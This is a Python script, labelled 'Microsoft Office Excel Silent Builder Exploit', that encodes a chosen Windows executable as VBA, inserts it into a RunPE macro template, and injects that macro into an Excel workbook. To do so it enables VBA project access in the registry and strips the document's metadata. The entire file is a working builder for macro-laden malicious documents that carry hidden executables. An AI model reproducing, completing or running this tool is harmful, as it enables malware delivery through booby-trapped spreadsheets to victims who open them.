from csv import excel
import os, sys
from winreg import *
import itertools
from contextlib import contextmanager
from win32api import GetFileVersionInfo, LOWORD, HIWORD
from os import path
import platform
import os.path
import zipfile
import base64
import os.path
import time
from random import randrange

lib_bs64 = ''

if platform.system().lower() == "windows":
    os.system('color')
    import win32com.client
    import winreg
    decoded = base64.b64decode(lib_bs64) 
    filename = 'lib.zip' 
    with open(filename, 'wb') as f: 
       f.write(decoded) 
           
else:
    print("\033[91m[+] Only for Windows :(")
    sys.exit()

zip_file = "lib.zip"
 
try:
    with zipfile.ZipFile(zip_file) as z:
        z.extractall()
        print("\033[1;77m[+] Extracted all \033[0m")
except:
    print("Already installed")

file_exists = os.path.exists('RunPE.vba')

if file_exists == False:
  print("RunPE.vba not found")
  sys.exit()

# Conveting file

format_number =  {'.xlsm': 52,'.xls': 56}

def is_xls_xml(infile):
    if os.path.splitext(infile)[1].lower()=='.xml':
        with open(infile, "r") as f:
            lines = f.read(65536).split("\n")[0:5]
            if (len(lines)>3 and
                lines[0].strip()=='<?xml version="1.0"?>' and
                    lines[1].strip()=='<?mso-application progid="Excel.Sheet"?>'):
                return True
    return False


def excel_convert(infile, out_ext):
    import win32com.client

    if out_ext not in format_number:
        raise ValueError("Unknown extension '{}': valid extensions: {}".format(out_ext, format_number.keys()))

    infile_fullpath = os.path.abspath(infile)
    (base, in_ext) = os.path.splitext(infile_fullpath)

    wb = None
    if not os.path.isfile(infile_fullpath):
        raise FileNotFoundError(infile_fullpath)

    outfile    = base +out_ext
    if os.path.exists(outfile):
        raise FileExistsError(outfile)

    if in_ext==out_ext:
        raise ValueError(f"Input extension {in_ext} matches output extension {out_ext}")

    if in_ext.lower()=='.xml' and not is_xls_xml(infile_fullpath):
        raise RuntimeError(f"{in_ext} is not an XLS XML file")

    excel = win32com.client.DispatchEx("Excel.Application")
    excel.Visible = 0
    excel.DisplayAlerts = False

    print("Opening {}".format(infile_fullpath))
    wb = excel.Workbooks.Open(infile_fullpath)

    if out_ext == '.pdf':
        for ws in wb.Worksheets:
            ws.Activate()                       
            excel.ActiveSheet.Columns.AutoFit()

            excel.PrintCommunication    = False

            ws.PageSetup.LeftMargin = 36
            ws.PageSetup.RightMargin = 36
            ws.PageSetup.TopMargin = 36
            ws.PageSetup.BottomMargin = 36

            ws.PageSetup.FitToPagesWide = 1

            excel.PrintCommunication    = True

    print("{} => {}".format(infile_fullpath, outfile))

    wb.Worksheets.Select()
    wb.SaveAs(outfile, FileFormat=format_number[out_ext])
    wb.Close(False)         
    excel.Quit()
    return True

# Main Processing
def enableVbomExcel():
    objExcel = win32com.client.Dispatch("Excel.Application")
    objExcel.Visible = False  
    version = objExcel.Application.Version
    objExcel.Application.Quit()
    del objExcel

    keyval = "Software\\Microsoft\Office\\" + version + "\\Excel\\Security"
    print("\033[1;77m[+] Set %s to 1...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 1)  
    winreg.CloseKey(Registrykey)

def disableVbomExcel():
    objExcel = win32com.client.Dispatch("Excel.Application")
    objExcel.Visible = False  
    version = objExcel.Application.Version
    keyval = "Software\\Microsoft\Office\\" + version + "\\Excel\\Security"
    print("\033[1;77m[+] Set %s to 0...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 0) 
    winreg.CloseKey(Registrykey)

def excelMacro(filepath,macro_path):
    enableVbomExcel()

    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)
    
    pathToExcelFile = path + '\\' + filepath
    pathToMacro = path + '\\' + macro_path

    with open(pathToMacro, "r") as myfile:
        print('\033[1;77m[+] Reading macro into string from: \033[0m' + str(myfile))
        macro = myfile.read()

    print("\033[1;77mPlease waiting... \033[0m")         

    excel = win32com.client.Dispatch("Excel.Application")

    excel.Visible = False

    workbook = excel.Workbooks.Open(Filename=pathToExcelFile)

    excelModule = workbook.VBProject.VBComponents.Add(1)
    excelModule.CodeModule.AddFromString(macro)

    print("\033[1;77m[+] Remove hidden data and personal info...\033[0m")
    xlRDIAll = 99
    workbook.RemoveDocumentInformation(xlRDIAll)
    excel.Workbooks(1).Close(SaveChanges=1)
    excel.Application.Quit()
    del excel

    disableVbomExcel()

    print("\033[1;77m[+] File is finalizing...\033[0m")

    excel_convert(pathToExcelFile,".xls")

    print("\033[1;77m[+] Process successfully completed \033[0m")
    
    os.remove("lib.zip")
    os.remove("RunPE.vba")

# PE to VBA Converting

MAX_PROC_SIZE = 50 
MAX_LINE_SIZE = 50 
TAG_PE2VBA_BEGIN = "' ===== BEGIN PE2VBA ====="
TAG_PE2VBA_END = "' ===== END PE2VBA ====="

def is_printable(c):
 
  if c >= 0x20 and c < 0x7F and c != 0x22:
    return True
  else:
    return False

def pe_to_vba(pe):
  block = "" 
  line = ""
  ba = bytearray(pe)
  
  blocks = []
  cnt_bytes_current_line = 0
  cnt_lines_current_block = 0
  cnt_bytes_total = 0 
  prev_char_was_printable = False
  
  for b in ba:
  
    if cnt_lines_current_block == 0:
      
      block = "    strPE = \"\"\n"   
      cnt_lines_current_block += 1 
    if cnt_bytes_current_line == 0:
      
      line = "strPE"
    
    if is_printable(b):
      if prev_char_was_printable:
        line += chr(b)
      else:
        line = "B(%s, \"%s" % (line, chr(b))
      prev_char_was_printable = True
    else:
      if prev_char_was_printable:
        line += "\")"
      line = "A(%s, %s)" % (line, str(b))
      prev_char_was_printable = False
    
    cnt_bytes_current_line += 1 
    cnt_bytes_total += 1 

   
    if cnt_bytes_current_line == MAX_LINE_SIZE or cnt_bytes_total == len(ba):
      if prev_char_was_printable:
        block += "    strPE = %s\")\n" % (line)
      else:
        block += "    strPE = %s\n" % (line)
      prev_char_was_printable = False 
      cnt_bytes_current_line = 0
      cnt_lines_current_block += 1

   
    if cnt_lines_current_block == MAX_PROC_SIZE or cnt_bytes_total == len(ba):
      cnt_lines_current_block = 0 
      cnt_bytes_current_line = 0 
      blocks.append(block) 
  
 
  proc = ""
  for i in range(len(blocks)):
    proc += "Private Function PE" + str(i) + "() As String\n"
    proc += "   Dim strPE As String\n\n"
    proc += blocks[i]
    proc += "\n    PE" + str(i) + " = strPE\n"
    proc += "End Function\n\n"
  
  vba = ""
  vba += proc
  vba += "Private Function PE() As String\n"
  vba += "    Dim strPE As String\n"
  vba += "    strPE = \"\"\n"
  for i in range(len(blocks)):
    vba += "    strPE = strPE + PE" + str(i) + "()\n"
  vba += "    PE = strPE\n" 
  vba += "End Function\n" 
  
  return vba 

def apply_template(pe_as_vba):
  res = ""
  
  tmpl_dir = os.path.dirname(os.path.realpath(__file__))
  tmpl_filepath = os.path.join(tmpl_dir, "RunPE.vba") 
  
  if os.path.isfile(tmpl_filepath):
  
    tmpl_file = open(tmpl_filepath , "r") 
    concat_line = True
    
    for line in tmpl_file:
      cur_line = line.rstrip()
      
      if cur_line == TAG_PE2VBA_END:
        concat_line = True 
        
      if concat_line:
        res += line 
      
      if cur_line == TAG_PE2VBA_BEGIN:  
        concat_line = False 
        res += pe_as_vba 
    
    tmpl_file.close() 
      
  else:
    print("[!] Cannot find file: '%s'" % tmpl_filepath) 
  
  return res


def main():

  print("\033[1;77m--- Microsoft Office Excel Silent Builder Exploit ---\033[0m")
  print("\033[1;77m---------- Author: viper_8080 - 0day.today ----------\033[0m \n")

  pefile = input("\033[1;77mInput filename (.exe): \033[0m")

  pe_file = open(pefile, "rb") 
  pe = pe_file.read() 
  pe_file.close() 
  
  pe_as_vba = pe_to_vba(pe) 
    
  out_file_content = apply_template(pe_as_vba)
  
  macro_name = "%s.vba" % (pefile)
  out_file = open(macro_name , "w") 
  out_file.write(out_file_content) 
  out_file.close()

  if os.path.isfile(macro_name): 
    print("\033[1;77m[+] Created file '%s'." % (macro_name) + " \033[0m")
  
  excelfile = input("\033[1;77mInput Filename (.xls): \033[0m")
 
  excel_convert(excelfile, ".xlsm")
  os.remove(excelfile)
  excelMacro(excelfile.replace("xls","xlsm"), "putty.exe.vba")
  time.sleep(1)

if __name__ == '__main__':
  main() 